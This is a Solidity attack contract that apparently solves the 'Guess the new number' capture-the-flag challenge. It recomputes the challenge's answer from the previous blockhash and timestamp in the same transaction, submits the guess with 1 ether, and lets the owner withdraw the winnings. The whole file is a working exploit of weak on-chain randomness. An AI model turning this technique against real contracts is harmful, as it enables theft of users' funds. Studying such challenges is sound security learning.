pragma solidity 0.8.11;

interface GuessTheNewNumberChallenge {
    function guess(uint8) external payable;
    function isComplete() external returns (bool);
}
contract AttackNewNumber {

    address owner;
    GuessTheNewNumberChallenge challenge;
    event AnswerEvent(uint8 answer);
    constructor() payable {
        owner = msg.sender;
    }

    function guess(address challenge_address) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encode(blockhash(block.number - 1), block.timestamp))));
        emit AnswerEvent(answer);
        challenge = GuessTheNewNumberChallenge(challenge_address);
        challenge.guess{value: msg.value}(answer);
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}

}